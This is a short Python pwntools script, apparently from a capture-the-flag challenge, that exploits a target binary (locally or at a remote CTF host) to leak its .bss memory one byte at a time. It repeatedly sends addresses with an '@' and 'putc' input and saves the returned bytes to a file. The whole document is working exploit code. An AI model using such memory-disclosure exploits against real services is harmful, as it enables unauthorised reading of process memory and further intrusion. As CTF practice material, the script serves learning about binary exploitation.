from tqdm import tqdm
from pwn import *

elf = ELF('./challenge/chal')
context.terminal = ['tmux', 'splitw', '-h']

bss = f'{os.path.basename(elf.path)}.bss'
if os.path.exists(bss):
    os.rename(bss, f'{bss}.bak')

base = 0x804ac0c
chunk_size = 128
batches = 0x1680 // chunk_size

for chunk in range(batches):
    data = []

    if args.REMOTE:
        r = remote('chall.polygl0ts.ch', 9012)
    else:
        r = process(elf.path)
        if args.GDB:
            gdb.attach(r)

    for idx in tqdm(range(chunk_size)):
        offset = chunk * chunk_size + idx
    
        r.sendline(f'{base + offset}'.encode())
        r.sendline(b'@')
        r.sendline(b'putc')
    
        ret = r.recv(1)
        data.append(ret)

    with open(bss, 'ab') as f:
        f.write(b''.join(data))

    r.close()

